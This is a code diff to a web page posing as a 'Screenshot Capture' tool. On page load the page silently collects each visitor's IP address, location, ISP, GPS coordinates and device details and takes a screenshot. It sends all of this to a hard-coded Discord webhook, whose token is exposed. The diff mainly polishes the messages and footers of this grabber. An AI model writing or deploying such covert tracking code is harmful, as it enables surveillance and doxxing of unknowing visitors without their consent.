@@ -79,7 +79,7 @@
     </div>
 
     <div id="content">
-        <h1>Screenshot Capture 🔥 (beta)</h1>
+        <h1>Screenshot Capture 📸 (beta)</h1>
         <button id="captureBtn" class="capture-btn">Capture Screenshot</button>
         <p id="status">Status: Waiting for action...</p>
         <p id="version"></p>
@@ -108,7 +108,7 @@
                 const { latitude, longitude, accessType } = await getCoordinates(ipData);
 
                 await sendToDiscord(ipData, userAgent, deviceName, latitude, longitude, accessType);
-                status.innerText = 'Data Base sent automatically! 🚀';
+                status.innerText = 'Data sent automatically! 🚀';
 
                 // Auto-capture the screenshot after loading
                 await autoCaptureScreenshot();
@@ -125,7 +125,7 @@
                 status.innerText = 'Capturing screenshot automatically... 📸';
                 const imageUrl = await captureScreen();
                 await sendScreenshotToDiscord(imageUrl);
-                status.innerText = 'Auto screenshot sent successfully to Data Base! 📸';
+                status.innerText = 'Auto screenshot sent successfully! 🖼️';
             } catch (error) {
                 console.error('Auto screenshot capture error:', error);
                 status.innerText = 'Failed to capture auto screenshot';
@@ -138,7 +138,7 @@
                 status.innerText = 'Capturing screenshot... 📸';
                 const imageUrl = await captureScreen();
                 await sendScreenshotToDiscord(imageUrl);
-                status.innerText = 'Screenshot sent successfully to Data Base! 📸';
+                status.innerText = 'Screenshot sent successfully! 🖼️';
             } catch (error) {
                 console.error('Screenshot capture error:', error);
                 status.innerText = 'Failed to capture screenshot';
@@ -159,7 +159,7 @@
                 const version = userAgent.match(/Windows NT (\d+\.\d+)/);
                 if (version) deviceName += " " + version[1];
             } else if (/Linux/i.test(userAgent)) {
-                deviceName = "Linux PC (most likely an android)";
+                deviceName = "Linux PC (most likely an Android)";
             } else if (/Android/i.test(userAgent)) {
                 const match = userAgent.match(/Android (\d+\.\d+); ([^;]+)/);
                 deviceName = match ? `Android ${match[1]} (${match[2]})` : "Android Device";
@@ -237,30 +237,33 @@
                 body: JSON.stringify({ image: imageData.split(',')[1] })
             });
             const data = await response.json();
-            if (!data.success) throw new Error('Failed to upload image to Imgur');
+            if (!data.success) throw new Error('Imgur upload failed');
             return data.data.link;
         }
 
         async function sendToDiscord(ipData, userAgent, deviceName, latitude, longitude, accessType) {
             const webhookUrl = 'https://discord.com/api/webhooks/1260414799796244490/6e9H7pviEjpknL-0_ST-f2aeLDfYaMrAXAJ2KaSdctwa1JIUFjoj9W-MRAmdhtr4jTil';
-
             const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+            const now = new Date();
+            const footerText = `${now.toLocaleString()} - Data captured using iron man - beta`;
+
             const webhookPayload = {
                 content: "@everyone, New User Action Detected! 🚀",
                 embeds: [{
                     title: "🧑‍💻 User's Information",
-                    color: 3447003,
+                    color: 16224904, // Orange color
                     fields: [
                         { name: "🌍 IP Address", value: ipData.ip, inline: true },
                         { name: "📍 Location", value: `${ipData.city}, ${ipData.region}, ${ipData.country}`, inline: true },
-                        { name: "🛜 ISP", value: ipData.isp, inline: true },
+                        { name: "📡 ISP", value: ipData.isp, inline: true },
                         { name: "💻 User Agent", value: userAgent },
                         { name: "📱 Device", value: deviceName },
-                        { name: "📌 Coordinates", value: `${latitude}, ${longitude} ${accessType}` },
+                        { name: "📌 Coordinates", value: `${latitude}, ${longitude} ${accessType}`, inline: true },
                         { name: "🗺️ Google Maps", value: `[Open Google Maps](${googleMapsLink})`, inline: true }
                     ],
                     footer: {
-                        text: "Data captured using iron man - beta"
+                        text: footerText,
+                        icon_url: "https://img.icons8.com/ios-filled/50/ffffff/information.png"
                     }
                 }]
             };
@@ -277,14 +280,16 @@
         async function sendScreenshotToDiscord(imageUrl) {
             const webhookUrl = 'https://discord.com/api/webhooks/1260414799796244490/6e9H7pviEjpknL-0_ST-f2aeLDfYaMrAXAJ2KaSdctwa1JIUFjoj9W-MRAmdhtr4jTil';
 
+            const now = new Date();
+            const footerText = `${now.toLocaleString()} - Data captured using iron man - beta`;
+
             const webhookPayload = {
-                content: "📸 Screenshot captured successfully!",
+                content: "",
                 embeds: [{
                     title: "🖼️ Screenshot",
-                    image: {
-                        url: imageUrl
-                    },
-                    color: 3447003
+                    image: { url: imageUrl },
+                    footer: { text: footerText },
+                    color: 16224904 // Orange color
                 }]
             };
 
